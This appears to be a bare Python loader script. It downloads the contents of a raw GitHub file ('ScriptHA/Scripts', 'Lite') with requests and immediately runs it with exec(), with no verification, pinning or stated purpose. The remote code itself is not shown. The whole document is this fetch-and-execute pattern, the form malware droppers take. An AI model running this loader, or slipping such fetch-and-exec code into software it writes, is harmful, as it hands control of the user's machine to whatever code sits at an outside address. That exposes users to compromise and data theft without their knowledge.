import requests

url = "https://raw.githubusercontent.com/ScriptHA/Scripts/refs/heads/main/Lite"
response = requests.get(url)

exec(response.text)
